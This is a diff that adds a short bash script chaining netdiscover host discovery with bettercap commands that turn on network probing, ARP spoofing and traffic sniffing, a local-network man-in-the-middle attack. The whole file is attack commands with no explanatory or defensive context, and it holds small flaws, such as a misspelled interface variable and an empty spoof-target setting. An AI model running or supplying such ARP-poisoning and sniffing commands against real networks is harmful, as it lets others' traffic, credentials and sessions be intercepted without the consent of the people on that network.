@@ -1,0 +1,5 @@
+#!/bin/bash
+echo 
+netdiscover -i $INTERNFACE
+bettercap  -eval "net.probe on; ticker on "
+bettercap  -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on"
